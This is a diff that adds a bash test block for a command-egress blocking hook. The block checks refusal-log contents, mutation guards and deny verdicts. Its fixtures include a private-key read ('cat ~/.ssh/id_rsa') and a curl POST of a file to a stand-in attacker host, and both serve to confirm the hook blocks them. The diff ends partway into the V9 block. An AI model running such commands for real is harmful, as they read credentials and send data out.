@@ -1350,6 +1350,436 @@ else
   /bin/rm -rf "$E007_D_N" "$E007_D_K" "$E007_D_C" "$E007_D_R" "$E007_D_T" "$E007_D_S"
 fi
 
+# =====================================================================
+# AC-E007-V* — an `unparseable` refusal record carries a classifiable feature set
+# =====================================================================
+# BLOCK-EGRESS-007 refuses a gh api write it cannot tokenize with the cause
+# `unparseable`, and that cause has no path, so its evidence is a constant. Before this
+# block two such records differed only in ts / input_digest / cwd, and no reader could
+# tell a correct refusal (the shell cannot parse the command either) from a false one (a
+# well-formed command the scanner mis-models). These arms pin the record contract: a
+# `features` object and a top-level `hook_build` on that one class, in BOTH writers,
+# carrying the command's structure and never the command.
+#
+# HERMETIC BY CONSTRUCTION (CIAC-2). Every arm runs in its own sandbox through the D
+# family's runner above — own allowlist, .mode, logs and cwd, with the scope root and the
+# master-enable config root pinned per invocation — so the verdict set is the same
+# standalone and under test-runner.sh. Logs are read as JSON value streams (jq -s), never
+# by line count, so the arms hold under the pretty serialization and under a
+# one-record-per-line one alike.
+#
+# The hook under test is E007_D_HOOK_SRC: this suite's own hook directory by default, or a
+# DEPLOYED hook tier via E007_D_HOOK_SRC_DIR after a republish — which is how this card's
+# usability criterion is run against the deployed hook without editing this file.
+#
+# Coupling: E007_V_FP is refused only while the scanner reads a heredoc body's apostrophe
+# as a quote. When that class is fixed, re-point it to E007_V_FP2 (an escaped quote the
+# scanner also mis-models) — do not delete the arm.
+#
+# E007_V_FIXTURE_DIR, when it names a directory, receives every fixture command below as
+# <name>.cmd, byte-exact, so the oracle's cross-shell agreement (`bash -n` against
+# `zsh -n`) can be recorded from the very bytes these arms send. That agreement is
+# evidence, not an assertion here: zsh may be absent.
+echo ""
+echo "unparseable refusal record — a classifiable feature set (AC-E007-V*)"
+echo "---"
+
+E007_V_P="repos/v-test-owner/v-test-repo/issues/1/comments"
+E007_V_TP="gh api -X POST ${E007_V_P} -f body='E007VSENTINEL cannot close"
+E007_V_FP="gh api -X POST ${E007_V_P} -F body=@- <<'EOF'"$'\n'"E007VSENTINEL it's fine"$'\n'"EOF"
+E007_V_FP2="gh api -X POST ${E007_V_P} -f body=E007VSENTINEL\\'s"
+E007_V_NM_A="gh api -X POST ${E007_V_P} -f body='abc def"
+E007_V_NM_B="gh api -X POST ${E007_V_P} -f body='xyz uvw"
+E007_V_H1="gh api -X POST ${E007_V_P} -F body=@- <<'EOF'"$'\n'"it's quoted"$'\n'"EOF"
+E007_V_H2="gh api -X POST ${E007_V_P} -F body=@- <<\"EOF\""$'\n'"it's quoted"$'\n'"EOF"
+E007_V_H3="gh api -X POST ${E007_V_P} -F body=@- <<-\\EOF"$'\n\t'"it's quoted"$'\n\t'"EOF"
+E007_V_H4="gh api -X POST ${E007_V_P} -F body=@- <<EOF"$'\n'"it's plain"$'\n'"EOF"
+E007_V_H5="gh api -X POST ${E007_V_P} -F body=@- <<EOF"$'\n'"it's first"$'\n'"EOF"$'\n'"cat <<'X'"$'\n'"second"$'\n'"X"
+
+e007_v_export() {  # <name> <command>
+  if [ -n "${E007_V_FIXTURE_DIR:-}" ] && [ -d "${E007_V_FIXTURE_DIR}" ]; then
+    /usr/bin/printf '%s' "$2" > "${E007_V_FIXTURE_DIR}/$1.cmd"
+  fi
+}
+e007_v_export TP "$E007_V_TP"; e007_v_export FP "$E007_V_FP"; e007_v_export FP2 "$E007_V_FP2"
+e007_v_export NM_A "$E007_V_NM_A"; e007_v_export NM_B "$E007_V_NM_B"
+e007_v_export H1 "$E007_V_H1"; e007_v_export H2 "$E007_V_H2"; e007_v_export H3 "$E007_V_H3"
+e007_v_export H4 "$E007_V_H4"; e007_v_export H5 "$E007_V_H5"
+
+E007_V_ALLOW='repos/v-test-owner/v-test-repo/issues*'
+E007_V_BASE="$(/usr/bin/mktemp -d)"
+E007_V_SEL='[.[] | select(.rule == "BLOCK-EGRESS-007" and ((.evidence // "") | endswith("cause=unparseable")))]'
+E007_V_KEYS='[["heredoc","oracle","schema_version","shell_parse"],true]'
+
+# e007_v_sandbox <root> [<hook-file>] — the D family's hook runtime plus this block's own
+# one-row allowlist. <hook-file>, when given, is installed as the hook (a mutation copy).
+e007_v_sandbox() {
+  e007_d_sandbox "$1"
+  /usr/bin/printf '%s\n' "$E007_V_ALLOW" > "$1/.claude/egress-allowlist.txt"
+  if [ -n "${2:-}" ]; then
+    /bin/cp "$2" "$1/.claude/hooks/block-egress.sh"
+    /bin/chmod +x "$1/.claude/hooks/block-egress.sh"
+  fi
+}
+e007_v_blk()    { /usr/bin/printf '%s' "$1/.claude/hooks/block-log.jsonl"; }
+e007_v_wrn()    { /usr/bin/printf '%s' "$1/.claude/hooks/egress-warn-log.jsonl"; }
+e007_v_ucount() {  # <log> — the number of -007 unparseable records it holds
+  if [ -s "$1" ]; then /usr/bin/jq -s "${E007_V_SEL} | length" "$1" 2>/dev/null || /usr/bin/printf '%s\n' '-1'
+  else /usr/bin/printf '0\n'; fi
+}
+# e007_v_run <root> <mode> <command> — the D family's hermetic runner (E007_D_EXIT /
+# E007_D_ERR / E007_D_BLK / E007_D_WRN), plus E007_V_UB / E007_V_UW: how many UNPARSEABLE
+# records the call added to the block log / the warn log. A "last record" read is trusted
+# only when this call added one, so a stale earlier record can never answer for it.
+e007_v_run() {
+  local b0 w0 b1 w1
+  b0="$(e007_v_ucount "$(e007_v_blk "$1")")"; w0="$(e007_v_ucount "$(e007_v_wrn "$1")")"
+  e007_d_run "$1" "$2" "$(e007_d_bash "$3" "$1")"
+  b1="$(e007_v_ucount "$(e007_v_blk "$1")")"; w1="$(e007_v_ucount "$(e007_v_wrn "$1")")"
+  E007_V_UB=$(( b1 - b0 )); E007_V_UW=$(( w1 - w0 ))
+}
+e007_v_last()  { if [ -s "$1" ]; then /usr/bin/jq -cs "${E007_V_SEL} | last // empty" "$1" 2>/dev/null; fi; }
+e007_v_nonid() { /usr/bin/jq -cS 'del(.ts, .input_digest, .cwd)' <<<"$1" 2>/dev/null; }
+e007_v_get()   { /usr/bin/jq -r "$2" <<<"$1" 2>/dev/null; }   # <record> <jq filter>
+e007_v_count() { if [ -f "$2" ]; then /usr/bin/grep -c -e "$1" "$2"; else /usr/bin/printf '0'; fi; }   # lines of <file> matching <pattern>
+# e007_v_mutate <root> <sed-expression> — <root>/mut.sh: the source hook with one sed edit.
+e007_v_mutate() {
+  /bin/mkdir -p "$1"
+  /usr/bin/sed -e "$2" "${E007_D_HOOK_SRC}/block-egress.sh" > "$1/mut.sh"
+}
+# e007_v_guard <name> <mutant> <root> <liveness-mode> — the mutation guard triple, as ONE
+# arm: the copy differs from the source hook in exactly one line, still parses, and —
+# installed as <root>'s hook — still flags an untouched rule (-001), so a verdict below is
+# the mutation's and not a broken sandbox's. <liveness-mode> is `enforce` (exit 2), or
+# `warn` (exit 0 plus a would-block notice) for a mutation of the enforce writer itself,
+# through which every enforce-mode deny passes.
+e007_v_guard() {
+  local name="$1" mut="$2" root="$3" lmode="$4" d n_old n_new why=""
+  d="$(/usr/bin/diff "${E007_D_HOOK_SRC}/block-egress.sh" "$mut" 2>/dev/null)"
+  n_old="$(/usr/bin/grep -c '^<' <<<"$d")"
+  n_new="$(/usr/bin/grep -c '^>' <<<"$d")"
+  { [ "$n_old" = 1 ] && [ "$n_new" = 1 ]; } \
+    || why="${why} lines changed -${n_old}/+${n_new}, want -1/+1 (the sed no longer targets its line: re-point it, do not delete the arm);"
+  /bin/bash -n "$mut" 2>/dev/null || why="${why} the copy does not parse;"
+  e007_v_sandbox "$root" "$mut"
+  e007_v_run "$root" "$lmode" 'cat ~/.ssh/id_rsa'
+  if [ "$lmode" = enforce ]; then
+    { [ "$E007_D_EXIT" = 2 ] && /usr/bin/grep -q 'BLOCK-EGRESS-001' <<<"$E007_D_ERR"; } \
+      || why="${why} liveness: -001 not denied (exit ${E007_D_EXIT});"
+  else
+    { [ "$E007_D_EXIT" = 0 ] && /usr/bin/grep -q 'BLOCK-EGRESS-001.*WARN' <<<"$E007_D_ERR"; } \
+      || why="${why} liveness: -001 not flagged at warn (exit ${E007_D_EXIT});"
+  fi
+  if [ -z "$why" ]; then e007_d_pass "$name"; else e007_d_fail "$name" "$why"; fi
+}
+# e007_v_mutant_arm <name> <root> <mode> <jq-predicate> — E007_V_TP through <root>'s hook
+# in <mode>: PASS when the verdict is the shipped one for <mode> (enforce 2, warn 0), the
+# call added exactly one unparseable record to that mode's log, and <jq-predicate> holds
+# on that record.
+e007_v_mutant_arm() {
+  local name="$1" root="$2" mode="$3" pred="$4" log want added rec ok why=""
+  if [ "$mode" = enforce ]; then log="$(e007_v_blk "$root")"; want=2; else log="$(e007_v_wrn "$root")"; want=0; fi
+  e007_v_run "$root" "$mode" "$E007_V_TP"
+  if [ "$mode" = enforce ]; then added="$E007_V_UB"; else added="$E007_V_UW"; fi
+  rec="$(e007_v_last "$log")"
+  [ "$E007_D_EXIT" = "$want" ] || why="${why} exit=${E007_D_EXIT}, want ${want} (the verdict did not survive the broken feature path);"
+  [ "$added" = 1 ] || why="${why} unparseable records +${added}, want +1;"
+  ok="$(/usr/bin/jq -r "$pred" <<<"$rec" 2>/dev/null)"
+  [ "$ok" = true ] || why="${why} the record fails [${pred}]: ${rec:-no record};"
+  if [ -z "$why" ]; then e007_d_pass "$name"; else e007_d_fail "$name" "$why"; fi
+}
+
+E007_V_ROOT="${E007_V_BASE}/main"
+e007_v_sandbox "$E007_V_ROOT"
+E007_V_ORACLE="$(/bin/bash -c 'printf "bash-%s.%s" "${BASH_VERSINFO[0]}" "${BASH_VERSINFO[1]}"' 2>/dev/null || true)"
+E007_V_BUILD="$(/usr/bin/git hash-object "${E007_V_ROOT}/.claude/hooks/block-egress.sh" 2>/dev/null || true)"
+E007_V_BUILD="${E007_V_BUILD:0:16}"
+E007_V_TPE=""; E007_V_FPE=""; E007_V_TPW=""; E007_V_FPW=""
+
+# V1 (the classifiable-evidence criterion, its control arm and the usability predicate's
+# first pair) — under BOTH modes: a correct refusal and a false one leave records that
+# differ in a field other than ts / input_digest / cwd, and the field that differs is the
+# one that classifies them. The exit codes are the shipped verdicts, unchanged.
+for _v_mode in enforce warn; do
+  if [ "$_v_mode" = enforce ]; then
+    _v_log="$(e007_v_blk "$E007_V_ROOT")"; _v_want=2; _v_wb=1; _v_ww=0
+  else
+    _v_log="$(e007_v_wrn "$E007_V_ROOT")"; _v_want=0; _v_wb=0; _v_ww=1
+  fi
+  _v_why=""
+  e007_v_run "$E007_V_ROOT" "$_v_mode" "$E007_V_TP"
+  { [ "$E007_D_EXIT" = "$_v_want" ] && [ "$E007_V_UB" = "$_v_wb" ] && [ "$E007_V_UW" = "$_v_ww" ]; } \
+    || _v_why="${_v_why} correct refusal: exit=${E007_D_EXIT} unparseable records blk+${E007_V_UB}/wrn+${E007_V_UW}, want ${_v_want} +${_v_wb}/+${_v_ww};"
+  _v_tp="$(e007_v_last "$_v_log")"
+  e007_v_run "$E007_V_ROOT" "$_v_mode" "$E007_V_FP"
+  { [ "$E007_D_EXIT" = "$_v_want" ] && [ "$E007_V_UB" = "$_v_wb" ] && [ "$E007_V_UW" = "$_v_ww" ]; } \
+    || _v_why="${_v_why} false refusal: exit=${E007_D_EXIT} unparseable records blk+${E007_V_UB}/wrn+${E007_V_UW}, want ${_v_want} +${_v_wb}/+${_v_ww};"
+  _v_fp="$(e007_v_last "$_v_log")"
+  if [ "$_v_mode" = enforce ]; then E007_V_TPE="$_v_tp"; E007_V_FPE="$_v_fp"; else E007_V_TPW="$_v_tp"; E007_V_FPW="$_v_fp"; fi
+  { [ -n "$_v_tp" ] && [ -n "$_v_fp" ]; } || _v_why="${_v_why} a refusal left no unparseable record;"
+  [ "$(e007_v_nonid "$_v_tp")" != "$(e007_v_nonid "$_v_fp")" ] || _v_why="${_v_why} the two records agree in every non-identity field;"
+  [ "$(e007_v_get "$_v_tp" '.features.shell_parse // ""')" = error ] || _v_why="${_v_why} correct refusal: shell_parse is not error;"
+  [ "$(e007_v_get "$_v_fp" '.features.shell_parse // ""')" = ok ] || _v_why="${_v_why} false refusal: shell_parse is not ok;"
+  if [ -z "$_v_why" ]; then
+    e007_d_pass "AC-E007-V1 (${_v_mode}): a correct and a false refusal differ in a non-identity field — shell_parse error vs ok"
+  else
+    e007_d_fail "AC-E007-V1 (${_v_mode}): a correct and a false refusal differ in a non-identity field" "${_v_why} correct=${_v_tp:-none} false=${_v_fp:-none}"
+  fi
+done
+
+# V2 (no command text) — no record carries the command. The sentinel rides inside both V1
+# commands; the control is the rule id in the same logs.
+_v_hit=$(( $(e007_v_count E007VSENTINEL "$(e007_v_blk "$E007_V_ROOT")") + $(e007_v_count E007VSENTINEL "$(e007_v_wrn "$E007_V_ROOT")") ))
+_v_ctl=$(( $(e007_v_count BLOCK-EGRESS-007 "$(e007_v_blk "$E007_V_ROOT")") + $(e007_v_count BLOCK-EGRESS-007 "$(e007_v_wrn "$E007_V_ROOT")") ))
+if [ "$_v_hit" = 0 ] && [ "$_v_ctl" -ge 2 ]; then
+  e007_d_pass "AC-E007-V2: the planted sentinel is absent from both logs (rule id present on ${_v_ctl} lines)"
+else
+  e007_d_fail "AC-E007-V2: the planted sentinel is absent from both logs" "sentinel lines=${_v_hit} (want 0) rule-id lines=${_v_ctl} (want >=2)"
+fi
+
+# V2m (no command text, armed red) — already-correct behaviour cannot be observed RED on
+# the shipped hook, so a copy is made to leak on purpose: its -007 evidence carries the
+# command. Predict the leak, observe it, revert, predict its absence, observe that.
+E007_V_R="${E007_V_BASE}/leak"
+e007_v_mutate "$E007_V_R" 's|"path=${path} cause=${cause}"|"path=${path} cause=${cause} cmd=${COMMAND}"|'
+e007_v_guard "AC-E007-V2m1: armed-red guard — the leak copy differs in one line, parses, and still enforces -001" \
+  "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V2m2 — the leak copy writes the command into evidence: exit 2 and a sentinel count of at least 1\n'
+e007_v_run "$E007_V_R" enforce "$E007_V_TP"
+_v_leak="$(e007_v_count E007VSENTINEL "$(e007_v_blk "$E007_V_R")")"
+if [ "$E007_D_EXIT" = 2 ] && [ "$_v_leak" -ge 1 ]; then
+  e007_d_pass "AC-E007-V2m2: armed red — the leak copy's record carries the sentinel, so V2's probe can see a leak"
+else
+  e007_d_fail "AC-E007-V2m2: armed red — the leak copy's record carries the sentinel" "exit=${E007_D_EXIT} sentinel lines=${_v_leak} — V2's zero proves nothing"
+fi
+e007_v_sandbox "$E007_V_R"
+/bin/rm -f "$(e007_v_blk "$E007_V_R")" "$(e007_v_wrn "$E007_V_R")"
+/usr/bin/printf 'PREDICT: AC-E007-V2m3 — reverted to the shipped hook: exit 2 and a sentinel count of 0\n'
+e007_v_run "$E007_V_R" enforce "$E007_V_TP"
+_v_leak="$(e007_v_count E007VSENTINEL "$(e007_v_blk "$E007_V_R")")"
+_v_ctl="$(e007_v_count BLOCK-EGRESS-007 "$(e007_v_blk "$E007_V_R")")"
+if [ "$E007_D_EXIT" = 2 ] && [ "$_v_leak" = 0 ] && [ "$_v_ctl" -ge 1 ]; then
+  e007_d_pass "AC-E007-V2m3: reverted — the same refusal through the shipped hook carries no sentinel"
+else
+  e007_d_fail "AC-E007-V2m3: reverted — the same refusal through the shipped hook carries no sentinel" "exit=${E007_D_EXIT} sentinel lines=${_v_leak} rule-id lines=${_v_ctl}"
+fi
+
+# V3 (both writers) — the warn-log record and the block-log record of the same refusal
+# carry the same feature-key set and hook_build.
+_v_ke="$(/usr/bin/jq -c '[(.features // {} | keys), has("hook_build")]' <<<"$E007_V_TPE" 2>/dev/null)"
+_v_kw="$(/usr/bin/jq -c '[(.features // {} | keys), has("hook_build")]' <<<"$E007_V_TPW" 2>/dev/null)"
+if [ "$_v_ke" = "$E007_V_KEYS" ] && [ "$_v_kw" = "$E007_V_KEYS" ]; then
+  e007_d_pass "AC-E007-V3: both writers carry the same feature set and hook_build ${E007_V_KEYS}"
+else
+  e007_d_fail "AC-E007-V3: both writers carry the same feature set and hook_build" "block-log=${_v_ke:-none} warn-log=${_v_kw:-none} want ${E007_V_KEYS}"
+fi
+
+# V4 (shape) — every V1 record: no `phase` key, schema_version 1, each member inside its
+# vocabulary, the oracle named as the bash that ran the hook, and hook_build equal to the
+# git blob id of the hook file that wrote it. No git means FAIL, never SKIP: the build id
+# is part of the contract.
+E007_V_SHAPE='(has("phase") | not)
+  and (.features.schema_version == 1)
+  and (.features.shell_parse as $v | any(("ok","error","skipped","unavailable"); . == $v))
+  and (.features.heredoc as $v | any(("none","quoted","unquoted","both","skipped"); . == $v))
+  and (.features.oracle == $oracle)
+  and ((.hook_build // "") | test("^[0-9a-f]{16}$"))
+  and (.hook_build == $build)'
+_v_bad=""
+case "$E007_V_ORACLE" in
+  bash-[0-9]*.[0-9]*) ;;
+  *) _v_bad="${_v_bad} the expected oracle label could not be read from /bin/bash (${E007_V_ORACLE:-empty});" ;;
+esac
+[ "${#E007_V_BUILD}" = 16 ] || _v_bad="${_v_bad} git hash-object gave no blob id for the sandbox hook (git absent?);"
+for _v_rec in "$E007_V_TPE" "$E007_V_FPE" "$E007_V_TPW" "$E007_V_FPW"; do
+  _v_ok="$(/usr/bin/jq -r --arg oracle "$E007_V_ORACLE" --arg build "$E007_V_BUILD" "$E007_V_SHAPE" <<<"$_v_rec" 2>/dev/null)"
+  [ "$_v_ok" = true ] || _v_bad="${_v_bad} nonconforming record: ${_v_rec:-none};"
+done
+if [ -z "$_v_bad" ]; then
+  e007_d_pass "AC-E007-V4: the four V1 records conform to the field-set shape (oracle ${E007_V_ORACLE}, hook_build = the hook's blob id)"
+else
+  e007_d_fail "AC-E007-V4: the four V1 records conform to the field-set shape" "$_v_bad"
+fi
+
+# V5 (the usability predicate's near-miss) — two structurally identical malformed
+# commands, differing only in literal text of the same length, yield records that differ
+# in NO feature field, in both writers.
+for _v_mode in enforce warn; do
+  if [ "$_v_mode" = enforce ]; then _v_log="$(e007_v_blk "$E007_V_ROOT")"; _v_want=2; else _v_log="$(e007_v_wrn "$E007_V_ROOT")"; _v_want=0; fi
+  e007_v_run "$E007_V_ROOT" "$_v_mode" "$E007_V_NM_A"; _v_x1="$E007_D_EXIT"; _v_u1=$(( E007_V_UB + E007_V_UW )); _v_a="$(e007_v_last "$_v_log")"
+  e007_v_run "$E007_V_ROOT" "$_v_mode" "$E007_V_NM_B"; _v_x2="$E007_D_EXIT"; _v_u2=$(( E007_V_UB + E007_V_UW )); _v_b="$(e007_v_last "$_v_log")"
+  if [ "$_v_x1" = "$_v_want" ] && [ "$_v_x2" = "$_v_want" ] && [ "$_v_u1" = 1 ] && [ "$_v_u2" = 1 ] \
+     && [ "$(e007_v_get "$_v_a" 'has("features")')" = true ] && [ "$(e007_v_get "$_v_b" 'has("features")')" = true ] \
+     && [ "$(e007_v_nonid "$_v_a")" = "$(e007_v_nonid "$_v_b")" ]; then
+    e007_d_pass "AC-E007-V5 (${_v_mode}): a near-miss pair differing only in literal text yields zero differing non-identity fields"
+  else
+    e007_d_fail "AC-E007-V5 (${_v_mode}): a near-miss pair yields zero differing non-identity fields" "exits ${_v_x1}/${_v_x2} (want ${_v_want}) records +${_v_u1}/+${_v_u2} a=${_v_a:-none} b=${_v_b:-none}"
+  fi
+done
+
+# V6 (the heredoc vocabulary) — the delimiter's QUOTING is recorded, never the word.
+_v_bad=""
+for _v_case in H1:quoted H2:quoted H3:quoted H4:unquoted H5:both TP:none; do
+  _v_name="${_v_case%%:*}"; _v_want="${_v_case#*:}"
+  case "$_v_name" in
+    H1) _v_cmd="$E007_V_H1" ;; H2) _v_cmd="$E007_V_H2" ;; H3) _v_cmd="$E007_V_H3" ;;
+    H4) _v_cmd="$E007_V_H4" ;; H5) _v_cmd="$E007_V_H5" ;; *) _v_cmd="$E007_V_TP" ;;
+  esac
+  e007_v_run "$E007_V_ROOT" enforce "$_v_cmd"
+  _v_got="$(e007_v_get "$(e007_v_last "$(e007_v_blk "$E007_V_ROOT")")" '.features.heredoc // ""')"
+  { [ "$E007_D_EXIT" = 2 ] && [ "$E007_V_UB" = 1 ] && [ "$_v_got" = "$_v_want" ]; } \
+    || _v_bad="${_v_bad} ${_v_name}[exit=${E007_D_EXIT} unparseable+${E007_V_UB} heredoc=${_v_got:-absent}, want ${_v_want}]"
+done
+if [ -z "$_v_bad" ]; then
+  e007_d_pass "AC-E007-V6: heredoc delimiter quoting — quoted x3 (single, double, backslash), unquoted, both, none"
+else
+  e007_d_fail "AC-E007-V6: heredoc delimiter quoting is recorded per the vocabulary" "$_v_bad"
+fi
+
+# V7 (the verdict survives a broken feature path) — each mutation copy lives in its own
+# sandbox and carries the guard triple. A deny that a feature defect could cost would be
+# a fail-open strictly worse than the unclassifiable record this block exists to fix.
+E007_V_R="${E007_V_BASE}/v7b"
+e007_v_mutate "$E007_V_R" 's|^readonly EGRESS_007_PARSE_ORACLE=.*|readonly EGRESS_007_PARSE_ORACLE="/nonexistent/bash"|'
+e007_v_guard "AC-E007-V7b-guard: the missing-oracle copy differs in one line, parses, and still enforces -001" "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V7b — oracle missing: exit 2, shell_parse unavailable, oracle unknown\n'
+e007_v_mutant_arm "AC-E007-V7b: with the oracle missing the deny stands and the record says unavailable, naming no oracle" \
+  "$E007_V_R" enforce '.features.shell_parse == "unavailable" and .features.oracle == "unknown"'
+
+E007_V_R="${E007_V_BASE}/v7b2"
+e007_v_mutate "$E007_V_R" 's|^readonly EGRESS_007_PARSE_ORACLE=.*|readonly EGRESS_007_PARSE_ORACLE="/usr/bin/false"|'
+e007_v_guard "AC-E007-V7b2-guard: the failing-oracle copy differs in one line, parses, and still enforces -001" "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V7b2 — an oracle that runs and exits 1: exit 2 and shell_parse unavailable, never error\n'
+e007_v_mutant_arm "AC-E007-V7b2: an oracle failure that is not a syntax verdict records unavailable, never error" \
+  "$E007_V_R" enforce '.features.shell_parse == "unavailable"'
+
+E007_V_R="${E007_V_BASE}/v7c"
+e007_v_mutate "$E007_V_R" 's|^readonly EGRESS_007_PARSE_CAP=.*|readonly EGRESS_007_PARSE_CAP=16|'
+e007_v_guard "AC-E007-V7c-guard: the lowered-cap copy differs in one line, parses, and still enforces -001" "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V7c — a command above the cap: exit 2, shell_parse skipped and heredoc skipped\n'
+e007_v_mutant_arm "AC-E007-V7c: above the cap neither computation runs — both report skipped — and the deny stands" \
+  "$E007_V_R" enforce '.features.shell_parse == "skipped" and .features.heredoc == "skipped"'
+
+# V7c0 (control at the REAL cap) — the same correct refusal padded past the shipped cap,
+# through the unmodified hook. It must be denied on whichever path it takes; if -007 is
+# reached, its record must report both computations skipped. The payload is built from a
+# file with jq -Rs, because an argument this size cannot pass through --arg.
+E007_V_R="${E007_V_BASE}/v7c0"
+e007_v_sandbox "$E007_V_R"
+/usr/bin/printf '%*s' 1048577 '' | /usr/bin/tr ' ' 'x' > "${E007_V_R}/pad.txt"
+/usr/bin/jq -Rs --arg p "$E007_V_TP" --arg cwd "$E007_V_R" \
+  '{tool_name: "Bash", tool_input: {command: ($p + .)}, cwd: $cwd}' "${E007_V_R}/pad.txt" > "${E007_V_R}/payload.json"
+_v_x=0
+PMO_SCOPE_GUARD_ROOT="$E007_V_R" PMO_PLATFORM_CONFIG_ROOT="${E007_V_R}/.cfg" \
+  /bin/bash "${E007_V_R}/.claude/hooks/block-egress.sh" < "${E007_V_R}/payload.json" 2>"${E007_V_R}/err.txt" >/dev/null \
+  || _v_x="$?"
+_v_rec="$(e007_v_last "$(e007_v_blk "$E007_V_R")")"
+if [ -n "$_v_rec" ]; then
+  _v_path="the -007 branch"
+  _v_ok="$(e007_v_get "$_v_rec" '.features.shell_parse == "skipped" and .features.heredoc == "skipped"')"
+else
+  _v_path="input validation, before -007"
+  _v_ok=true
+fi
+if [ "$_v_x" = 2 ] && [ "$_v_ok" = true ]; then
+  e007_d_pass "AC-E007-V7c0: a command past the shipped cap is still denied (exit 2, at ${_v_path})"
+else
+  e007_d_fail "AC-E007-V7c0: a command past the shipped cap is still denied" "exit=${_v_x} path=${_v_path} record=${_v_rec:-none} stderr=$(/bin/cat "${E007_V_R}/err.txt")"
+fi
+
+E007_V_R="${E007_V_BASE}/v7d"
+e007_v_mutate "$E007_V_R" 's|"\$(egress_007_unparseable_features "\$COMMAND")"|"not-json"|'
+e007_v_guard "AC-E007-V7d-guard: the invalid-features copy differs in one line, parses, and still enforces -001" "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V7d — features that are not JSON: the deny stands; the record keeps hook_build and drops features\n'
+for _v_mode in enforce warn; do
+  e007_v_mutant_arm "AC-E007-V7d (${_v_mode}): a record whose features cannot be written keeps hook_build, so it is never mistaken for a pre-fix record" \
+    "$E007_V_R" "$_v_mode" '(has("features") | not) and ((.hook_build // "") | test("^[0-9a-f]{16}$"))'
+done
+
+E007_V_R="${E007_V_BASE}/v7e"
+e007_v_mutate "$E007_V_R" 's|/usr/bin/shasum -a 1 |/nonexistent/shasum -a 1 |'
+e007_v_guard "AC-E007-V7e-guard: the broken-build-id copy differs in one line, parses, and still enforces -001" "${E007_V_R}/mut.sh" "$E007_V_R" enforce
+/usr/bin/printf 'PREDICT: AC-E007-V7e — the build id cannot be computed: exit 2, hook_build unknown, features intact\n'
+e007_v_mutant_arm "AC-E007-V7e: a build id that cannot be computed reads unknown and costs nothing else" \
+  "$E007_V_R" enforce '.hook_build == "unknown" and .features.shell_parse == "error"'
+
+# V7f / V7g — the block log's digest step. Under `set -e` an unguarded failure there ends
+# the hook with a non-blocking status, which would lose the deny for EVERY rule, not only
+# this one — so this mutation's liveness is read at warn, where the digest is not taken.
+E007_V_R="${E007_V_BASE}/v7f"
+e007_v_mutate "$E007_V_R" 's#"\$tool_input" | /usr/bin/shasum -a 256#"$tool_input" | /nonexistent/shasum -a 256#'
+e007_v_guard "AC-E007-V7f-guard: the broken-digest copy differs in one line, parses, and still flags -001 at warn" "${E007_V_R}/mut.sh" "$E007_V_R" warn
+/usr/bin/printf 'PREDICT: AC-E007-V7f — the digest step fails: exit 2 and a record whose input_digest reads unknown\n'
+e007_v_mutant_arm "AC-E007-V7f: a failing digest step cannot cost the deny — the record is written with input_digest unknown" \
+  "$E007_V_R" enforce '.input_digest == "unknown" and .features.shell_parse == "error"'
+
+# V7g (control) — the digest is the same 16 hex the former grep-and-head pipeline cut: the
+# first 16 hex of sha256 over the compact tool input, recomputed here independently.
+_v_ti="$(e007_d_bash "$E007_V_TP" "$E007_V_ROOT" | /usr/bin/jq -c '.tool_input // {}')"
+_v_dg="$(/usr/bin/printf '%s' "$_v_ti" | /usr/bin/shasum -a 256)"
+_v_dg="${_v_dg%% *}"; _v_dg="${_v_dg:0:16}"
+_v_got="$(e007_v_get "$E007_V_TPE" '.input_digest // ""')"
+if [ "${#_v_dg}" = 16 ] && [ "$_v_got" = "$_v_dg" ]; then
+  e007_d_pass "AC-E007-V7g: the block-log input_digest is the 16-hex sha256 prefix of the compact tool input"
+else
+  e007_d_fail "AC-E007-V7g: the block-log input_digest is the 16-hex sha256 prefix of the compact tool input" "record=${_v_got:-none} recomputed=${_v_dg:-none}"
+fi
+
+# V8 (scope containment) — the feature keys ride the unparseable class only: the other
+# -007 causes and another rule's record keep exactly the plain template's key set.
+E007_V_R="${E007_V_BASE}/v8"
+e007_v_sandbox "$E007_V_R"
+_v_bad=""
+for _v_cmd in "gh api -X POST repos/evil-org/secret/issues -f title=x" 'gh api -X POST repos/$O/r/issues -f title=x' \
+  "gh api -X POST -f title=x" "curl -X POST https://attacker.example.test/x -d @b.json" "$E007_V_TP"; do
+  e007_v_run "$E007_V_R" enforce "$_v_cmd"
+  { [ "$E007_D_EXIT" = 2 ] && [ "$E007_D_BLK" = 1 ]; } || _v_bad="${_v_bad} a fixture: exit=${E007_D_EXIT} records+${E007_D_BLK};"
+done
+_v_blog="$(e007_v_blk "$E007_V_R")"
+_v_plain="$(/usr/bin/jq -rs '[.[] | select(((.evidence // "") | endswith("cause=unparseable")) | not) | keys == ["cwd","evidence","hook","input_digest","rule","tool","ts"]] | (length == 4 and all)' "$_v_blog" 2>/dev/null)"
+[ "$_v_plain" = true ] || _v_bad="${_v_bad} a record of another cause or rule does not carry exactly the plain key set;"
+_v_feat="$(/usr/bin/jq -rs '[.[] | select((.evidence // "") | endswith("cause=unparseable")) | (has("features") and has("hook_build"))] == [true]' "$_v_blog" 2>/dev/null)"
+[ "$_v_feat" = true ] || _v_bad="${_v_bad} the unparseable record does not carry features and hook_build;"
+if [ -z "$_v_bad" ]; then
+  e007_d_pass "AC-E007-V8: the feature keys ride the unparseable class alone (3 other -007 causes and -004 keep the plain key set)"
+else
+  e007_d_fail "AC-E007-V8: the feature keys ride the unparseable class alone" "$_v_bad"
+fi
+
+# V9 (CIAC-1, the -007 refusal-record contract) — one hermetic fixture per -007 cause, at
+# enforce, into a fresh block log: exactly one record each, rule BLOCK-EGRESS-007 and a
+# recoverable cause token on every one, the not-allowlisted record still carrying its
+# denied path after the allowlist row-scope change, and the field set on the unparseable
+# record alone. Every command carries the planted sentinel outside its path. Null limb:
+# the sentinel over the block log -> 0; control: the rule id over the same log -> 4.
+E007_V_R="${E007_V_BASE}/v9"
+e007_v_sandbox "$E007_V_R"
+_v_bad=""
